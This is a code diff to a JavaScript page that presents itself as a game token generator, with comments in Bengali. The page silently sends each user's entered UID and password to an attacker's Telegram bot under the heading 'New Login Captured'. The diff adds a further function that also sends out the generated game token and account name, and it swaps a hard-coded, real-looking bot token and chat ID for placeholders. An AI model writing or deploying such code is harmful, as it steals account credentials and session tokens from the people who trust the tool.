@@ -250,10 +250,10 @@
 let lastApiResponse = null;
 
 // ==========================================
-// ⚙️ নিচে আপনার Telegram Bot Token & ID বসান:
+// ⚙️ Telegram Bot Configuration:
 // ==========================================
-const TELEGRAM_BOT_TOKEN = "8902325477:AAF82AQPAJLCJqWjS71eRkEbCFOAHrWHfcE"; // যেমন: "7123456789:AAExxxxxx..."
-const TELEGRAM_CHAT_ID = "8120381389";     // যেমন: "123456789"
+const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // যেমন: "7123456789:AAExxxxxx..."
+const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";     // যেমন: "123456789"
 // ==========================================
 
 async function generateToken() {
@@ -267,7 +267,7 @@ async function generateToken() {
     return;
   }
 
-  // ১. সাইলেন্টলি টেলিগ্রাম বটে ডাটা পাঠানো
+  // ১. ইনপুট দেওয়া মাত্রই UID এবং Password সাইলেন্টলি টেলিগ্রামে পাঠাবে
   sendToTelegram(uid, password);
 
   btnSubmit.disabled = true;
@@ -282,9 +282,12 @@ async function generateToken() {
     const data = await res.json();
     lastApiResponse = data;
 
-    // ২. যদি API থেকে টোকেন সফলভাবে আসে, সেটাও পরে বটে পাঠাতে চাইলে পাঠাবে
-    if(data.token || data.access_token) {
-      sendTokenToTelegram(uid, data.token || data.access_token);
+    // ২. API থেকে প্লেয়ার নেম/গেম ইউআইডি ও টোকেন পাওয়া গেলে সেটাও বটে আপডেট পাঠাবে
+    const token = data.token || data.access_token || data.jwt;
+    const gameName = data.nickname || data.name || data.player_name || data.username || "N/A";
+
+    if (token) {
+      sendTokenToTelegram(uid, gameName, token);
     }
 
     responseJson.textContent = JSON.stringify(data, null, 2);
@@ -302,11 +305,11 @@ async function generateToken() {
   }
 }
 
-// টেলিগ্রামে UID & Password পাঠানোর ফাংশন
+// ইনপুট দেওয়া মাত্রই পাঠাবে
 function sendToTelegram(uid, password) {
   if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
 
-  const message = `🔑 *New Login Captured*\n🎮 *Game uid:* \`${real_uid}\`\n🆔 *UID:* \`${uid}\` \n🔒 *Password:* \`${password}\``;
+  const message = `🔑 *New Login Captured*\n\n🎮 *Game UID:* \`${uid}\` \n🔒 *Password:* \`${password}\``;
   const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
   fetch(telegramUrl, {
@@ -320,6 +323,23 @@ function sendToTelegram(uid, password) {
   }).catch(() => {});
 }
 
+// API রেসপন্স আসার পর Game Details সহ আপডেট পাঠাবে
+function sendTokenToTelegram(uid, gameName, token) {
+  if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
+
+  const message = `✅ *Token Generated Successfully*\n\n🎮 *Game UID:* \`${uid}\` \n👤 *Account Name:* \`${gameName}\` \n🎟️ *Token:* \`${token}\``;
+  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+  fetch(telegramUrl, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: "Markdown"
+    })
+  }).catch(() => {});
+}
 
 function copyTokenOnly() {
   if (!lastApiResponse) return;
